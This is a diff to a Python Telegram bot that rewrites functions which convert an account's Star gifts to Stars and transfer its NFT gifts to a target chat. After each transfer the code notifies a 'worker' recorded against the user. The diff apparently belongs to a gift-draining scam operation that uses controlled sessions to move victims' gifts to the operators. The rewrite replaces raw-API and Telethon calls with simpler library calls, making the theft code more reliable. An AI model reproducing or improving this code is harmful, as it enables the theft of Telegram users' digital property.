@@ -42,15 +42,6 @@ from aiogram.types import (
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 
 
-# Попытка импорта Telethon для конвертации подарков
-TELETHON_AVAILABLE = False
-try:
-    from telethon import TelegramClient
-    from telethon.tl.functions.payments import ConvertStarGiftRequest
-    from telethon.tl.types import InputStarGift
-    TELETHON_AVAILABLE = True
-except ImportError:
-    pass
 
 try:
     from pyrofork import Client, enums
@@ -984,147 +975,35 @@ async def send_gift_task(client: Client, target_id, price, target_username=None,
         return False
 
 async def convert_gift_task(client: Client, gift_details, raw_gift_obj=None):
-    """Конвертация подарка через Telethon"""
-    if not TELETHON_AVAILABLE:
+    """Конвертация подарка через высокоуровневый API"""
+    msg_id = gift_details.get('msg_id')
+    if not msg_id:
         return False
     
-    # Получаем saved_id из разных источников
-    saved_id = None
-    if raw_gift_obj:
-        saved_id = (getattr(raw_gift_obj, 'saved_id', None) or 
-                   getattr(raw_gift_obj, 'id', None) or
-                   getattr(raw_gift_obj, 'ID', None))
-    
-    if not saved_id:
-        saved_id = gift_details.get('id')
-    
-    # Если нет saved_id, ищем по msg_id
-    if not saved_id:
-        msg_id = gift_details.get('msg_id')
-        if msg_id:
-            try:
-                if PYROFORK_AVAILABLE:
-                    from pyrofork import raw
-                else:
-                    from pyrogram import raw
-                
-                result = await client.invoke(
-                    raw.functions.payments.GetSavedStarGifts(
-                        peer=raw.types.InputPeerSelf(),
-                        offset="",
-                        limit=100
-                    )
-                )
-                if hasattr(result, 'gifts') and result.gifts:
-                    for item in result.gifts:
-                        if getattr(item, 'msg_id', None) == int(msg_id):
-                            saved_id = (getattr(item, 'saved_id', None) or 
-                                       getattr(item, 'id', None) or
-                                       getattr(item, 'ID', None))
-                            if saved_id:
-                                break
-            except:
-                pass
-    
-    if not saved_id:
-        return False
-    
-    # Конвертируем через Telethon
     try:
-        session_name = getattr(client, 'session_name', None) or getattr(client, 'name', None)
-        if not session_name:
-            return False
-        
-        session_path = f"{session_name}.session"
-        if not os.path.exists(session_path):
-            return False
-        
-        api_id = getattr(client, 'api_id', None) or int(os.getenv('API_ID', 0))
-        api_hash = getattr(client, 'api_hash', None) or os.getenv('API_HASH', '')
-        
-        if not api_id or not api_hash:
-            return False
-        
-        telethon_client = TelegramClient(session_name, api_id, api_hash)
-        await telethon_client.connect()
-        
-        if not await telethon_client.is_user_authorized():
-            await telethon_client.disconnect()
-            return False
-        
-        input_gift = InputStarGift(saved_id=int(saved_id))
-        await telethon_client(ConvertStarGiftRequest(stargift=input_gift))
-        await telethon_client.disconnect()
+        await client.convert_gift_to_stars(owned_gift_id=str(msg_id))
         return True
-        
     except Exception:
-        try:
-            await telethon_client.disconnect()
-        except:
-            pass
         return False
 
 async def transfer_nft_task(client: Client, gift_details, target_chat_id, bot: Bot, user_db_data):
-    """Передача NFT через raw API"""
+    """Передача NFT через высокоуровневый API"""
     if not target_chat_id:
         return "failed"
     
-    # Получаем saved_id из gift_details или raw_gift_obj
-    saved_id = gift_details.get('id')
-    if not saved_id:
-        msg_id = gift_details.get('msg_id')
-        if msg_id:
-            try:
-                if PYROFORK_AVAILABLE:
-                    from pyrofork import raw
-                else:
-                    from pyrogram import raw
-                
-                result = await client.invoke(
-                    raw.functions.payments.GetSavedStarGifts(
-                        peer=raw.types.InputPeerSelf(),
-                        offset="",
-                        limit=100
-                    )
-                )
-                if hasattr(result, 'gifts') and result.gifts:
-                    for item in result.gifts:
-                        if getattr(item, 'msg_id', None) == int(msg_id):
-                            saved_id = (getattr(item, 'saved_id', None) or 
-                                       getattr(item, 'id', None) or
-                                       getattr(item, 'ID', None))
-                            if saved_id:
-                                break
-            except:
-                pass
-    
-    if not saved_id:
+    msg_id = gift_details.get('msg_id')
+    if not msg_id:
         return "failed"
     
     try:
-        if PYROFORK_AVAILABLE:
-            from pyrofork import raw
-        else:
-            from pyrogram import raw
-        
-        # Получаем peer получателя
+        # Получаем username или ID получателя
         try:
             chat = await client.get_chat(target_chat_id)
-            if chat.id > 0:
-                peer = raw.types.InputPeerUser(user_id=chat.id, access_hash=0)
-            else:
-                peer = raw.types.InputPeerChannel(channel_id=abs(chat.id), access_hash=0)
+            target_username = chat.username or str(chat.id)
         except:
-            peer = raw.types.InputPeerUser(user_id=target_chat_id, access_hash=0)
+            target_username = str(target_chat_id)
         
-        # Передаем NFT
-        saved_id_int = int(saved_id)
-        await client.invoke(
-            raw.functions.payments.TransferStarGift(
-                saved_id=saved_id_int,
-                peer=peer
-            )
-        )
+        await client.transfer_gift(owned_gift_id=str(msg_id), new_owner_chat_id=target_username)
         
         # Уведомляем воркера
         if user_db_data and user_db_data.get('worker_id'):
@@ -1141,28 +1020,14 @@ async def transfer_nft_task(client: Client, gift_details, target_chat_id, bot: B
         
     except FloodWait as e:
         await asyncio.sleep(e.value)
-        # Повторная попытка после ожидания
         try:
-            if PYROFORK_AVAILABLE:
-                from pyrofork import raw
-            else:
-                from pyrogram import raw
-            
             try:
                 chat = await client.get_chat(target_chat_id)
-                if chat.id > 0:
-                    peer = raw.types.InputPeerUser(user_id=chat.id, access_hash=0)
-                else:
-                    peer = raw.types.InputPeerChannel(channel_id=abs(chat.id), access_hash=0)
+                target_username = chat.username or str(chat.id)
             except:
-                peer = raw.types.InputPeerUser(user_id=target_chat_id, access_hash=0)
+                target_username = str(target_chat_id)
             
-            await client.invoke(
-                raw.functions.payments.TransferStarGift(
-                    saved_id=saved_id_int,
-                    peer=peer
-                )
-            )
+            await client.transfer_gift(owned_gift_id=str(msg_id), new_owner_chat_id=target_username)
             return "success"
         except:
             return "failed"
